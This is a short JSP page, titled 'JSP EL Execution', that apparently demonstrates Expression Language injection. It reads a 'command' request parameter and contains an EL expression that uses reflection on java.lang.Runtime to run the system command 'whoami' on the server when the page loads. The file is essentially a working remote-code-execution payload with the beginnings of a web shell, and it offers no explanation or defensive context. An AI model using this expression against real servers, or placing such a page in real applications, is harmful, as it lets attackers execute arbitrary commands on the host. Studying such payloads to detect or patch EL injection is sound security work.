<%@ page language="java" contentType="text/html; charset=US-ASCII" pageEncoding="US-ASCII" import="java.util.*"%>
<%@ page isELIgnored="false"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=US-ASCII">
		<title>JSP EL Execution</title>
	</head>
	<body>
	<%
			String commandtoexecute =  request.getParameter("command");
	%>
	<div id="sampleElExpressionsDiv">
		<span><strong>Executing Runtime := </strong> ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("whoami")}
	</div>
	</body>
</html>